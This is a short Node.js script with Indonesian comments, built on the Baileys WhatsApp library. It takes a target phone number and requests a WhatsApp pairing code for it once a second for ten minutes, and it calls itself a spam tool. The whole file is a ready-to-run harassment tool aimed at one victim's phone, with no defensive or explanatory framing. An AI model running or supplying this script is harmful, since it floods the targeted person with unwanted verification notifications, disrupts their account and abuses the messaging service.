const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");

async function spam(nomor) {
  try {
    const { state } = await useMultiFileAuthState("./database/p-84a6p3x9omu");

    const client = makeWASocket({
      printQRInTerminal: false,
      browser: Browsers.macOS("Edge"),
      auth: state,
      logger: pino({ level: "fatal" }),
    });

    console.log(`Memulai proses untuk nomor ${nomor}`);

    const intervalId = setInterval(async () => {
      try {
        await client.requestPairingCode(nomor);
        console.log(`[ BERHASIL ] Pairing request sent to ${nomor}`);
      } catch (err) {
        console.error(`[ ERROR ] Gagal mengirim pairing request ke ${nomor}`);
      }
    }, 1000);

    setTimeout(() => {
      clearInterval(intervalId);
      console.log(`[INFO] Spam selesai untuk nomor ${nomor}`);
    }, 10 * 60 * 1000); // Hentikan setelah 10 menit
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan pada nomor ${nomor}: `, err.message);
  }
}

// Jalankan fungsi spam berdasarkan parameter nomor
const targetNumber = process.argv[2];
if (targetNumber) {
  spam(targetNumber);
} else {
  console.error("[ERROR] Nomor target tidak diberikan.");
}